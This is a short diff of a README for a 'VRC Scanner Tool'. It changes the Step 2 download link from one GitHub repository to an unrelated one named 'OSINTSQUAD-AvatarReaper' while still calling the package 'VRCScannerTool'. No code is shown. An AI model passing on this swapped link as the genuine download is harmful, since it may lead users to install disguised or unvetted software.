@@ -12,7 +12,7 @@ To ensure that the tool runs smoothly, you need to install Microsoft Visual C++ 
 
 ### Step 2: Install the 'VRC Scanner Tool' Package
 
-Download the 'VRCScannerTool' package from our [GitHub releases](https://github.com/KaichiSama/VRCScannerTool/releases/tag/VRCST) page.
+Download the 'VRCScannerTool' package from our [GitHub releases](https://github.com/ErrorNoName/OSINTSQUAD-AvatarReaper/releases/tag/OsintSquad) page.
 
 ### Step 3: Run the Tool
 
